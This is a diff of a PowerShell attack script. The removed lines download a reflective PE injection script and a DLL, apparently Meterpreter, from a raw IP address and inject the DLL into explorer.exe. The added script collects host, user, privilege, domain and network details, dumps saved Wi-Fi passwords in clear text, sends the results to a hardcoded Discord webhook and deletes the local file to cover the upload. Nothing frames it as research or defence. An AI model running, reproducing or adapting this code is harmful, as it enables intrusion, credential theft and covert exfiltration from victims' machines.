@@ -1,15 +1,88 @@
-$ps1Url = "http://62.60.159.191/Invoke-ReflectivePEInjection.ps1"
-$ps1Content = (New-Object System.Net.WebClient).DownloadString($ps1Url)
+# === system-snapshot-and-upload.ps1 ===
+param(
+    [string]$OutFile    = 'C:\Users\Public\123.txt',
+    [string]$WebhookUrl = 'https://discord.com/api/webhooks/1198720468656607305/dM6aLmCMHIy-UQGkbeyzL4LZGY-N6G_2Q4X-R44YBT3D2KxohEAxvq38GBbQ3T14t7HE'
+)
 
-# Выполняем скачанный скрипт в памяти, чтобы определить функцию Invoke-ReflectivePEInjection
-Invoke-Expression $ps1Content
+"=== System snapshot: $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK') ===" | Out-File -FilePath $OutFile -Encoding utf8
 
-# 2. Скачиваем DLL (например, Meterpreter DLL)
-$dllUrl = "http://62.60.159.191/support.dll"
-$peBytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
+function Add-Section {
+    param($Title,$Content)
+    Add-Content -Path $OutFile -Encoding utf8 -Value "`r`n=== $Title ===`r`n$Content"
+}
 
-# 3. Получаем ID процесса, в который будем инжектировать DLL (например, explorer.exe)
-$procId = (Get-Process -Name explorer).Id
+function Get-UsersListing {
+    param($Root='C:\Users',$MaxDepth=2)
+    $res = [System.Collections.Generic.List[string]]::new()
+    $st  = [System.Collections.Stack]::new()
+    $st.Push(@{Path=$Root;Depth=0})
+    while ($st.Count) {
+        $f = $st.Pop(); $p = $f.Path; $d = $f.Depth
+        try { $it = Get-ChildItem -LiteralPath $p -Force -ErrorAction Stop }
+        catch { $res.Add("ACCESS_DENIED`t$p"); continue }
+        foreach ($i in $it) {
+            $type = if ($i.PSIsContainer) { "DIR" } else { "FILE" }
+            $size = if ($i.PSIsContainer) { "" } else { $i.Length }
+            $res.Add("{0}`t{1}`t{2}`t{3:yyyy-MM-dd HH:mm:ss}" -f $type,$i.FullName,$size,$i.LastWriteTime)
+            if ($i.PSIsContainer -and $d -lt ($MaxDepth-1)) {
+                $st.Push(@{Path=$i.FullName;Depth=$d+1})
+            }
+        }
+    }
+    $res -join "`r`n"
+}
 
-# 4. Выполняем reflective DLL инъекцию, вызывая функцию из загруженного PS1-скрипта
-Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $procId
+$hn = hostname
+$cu = whoami | Out-String
+Add-Section "Host" "Hostname: $hn`r`nCurrent user: $cu"
+
+try {
+    if (Get-Command Get-LocalUser -ErrorAction 0) {
+        $lu = Get-LocalUser | Format-Table Name,Enabled,LastLogon -AutoSize | Out-String
+    } else {
+        $lu = net user | Out-String
+    }
+    Add-Section "Local users" $lu
+} catch {}
+
+try {
+    Add-Section "User groups" (whoami /groups | Out-String)
+    Add-Section "User privileges" (whoami /priv | Out-String)
+} catch {}
+
+try {
+    $cs = Get-WmiObject Win32_ComputerSystem
+    Add-Section "Domain" ($(if ($cs.PartOfDomain) { "Joined: $($cs.Domain)" } else { "Not domain-joined" }))
+} catch {}
+
+try { Add-Section "C:\Users listing (depth=2)" (Get-UsersListing) } catch {}
+
+try {
+    $profiles = (netsh wlan show profiles) -match ':\s*(.+)$' | ForEach-Object { $_.Split(':')[1].Trim() }
+    $wifiProf = $profiles | ForEach-Object { "=== Wi-Fi profile: $_ ===`r`n" + (netsh wlan show profile name="$_" key=clear | Out-String) }
+    Add-Section "Wi-Fi" ((netsh wlan show interfaces | Out-String) + ($wifiProf -join "`r`n") + (netsh wlan show networks mode=bssid | Out-String))
+} catch {}
+
+try { Add-Section "ipconfig /all" (ipconfig /all | Out-String) } catch {}
+
+if ($cs -and $cs.PartOfDomain) {
+    try {
+        $du = net user /domain | Out-String
+        Add-Section "Domain users" $du
+        $du | Out-File -FilePath 'C:\Users\Public\users.txt' -Encoding utf8
+    } catch {}
+}
+
+"=== Done: $OutFile ===" | Add-Content -Path $OutFile -Encoding utf8
+
+Add-Type -AssemblyName System.Net.Http
+$cl = [System.Net.Http.HttpClient]::new()
+$fm = [System.Net.Http.MultipartFormDataContent]::new()
+$fm.Add([System.Net.Http.StringContent]::new('{"content":"файл 123.txt загружен"}',[Text.Encoding]::UTF8,'application/json'),'payload_json')
+$st = [IO.File]::OpenRead($OutFile)
+$pt = [System.Net.Http.StreamContent]::new($st); $pt.Headers.ContentType = 'text/plain'
+$fm.Add($pt,'file',[IO.Path]::GetFileName($OutFile))
+$resp = $cl.PostAsync($WebhookUrl,$fm).Result
+if ($resp.IsSuccessStatusCode) { Remove-Item -LiteralPath $OutFile -Force } else { Write-Warning "Upload failed: $($resp.StatusCode)" }
+$st.Dispose()
+$cl.Dispose()
